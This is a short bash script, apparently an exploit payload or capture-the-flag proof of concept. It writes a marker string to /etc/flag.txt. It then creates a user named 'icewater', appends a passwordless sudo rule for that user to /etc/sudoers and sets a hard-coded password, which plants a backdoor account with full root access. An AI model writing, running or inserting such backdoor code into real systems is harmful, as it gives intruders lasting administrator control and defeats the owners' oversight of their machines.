#!/bin/bash
echo "It worked!" > /etc/flag.txt
adduser --gecos none icewater --disabled-password
echo "icewater ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "icewater:Access1234" | chpasswd
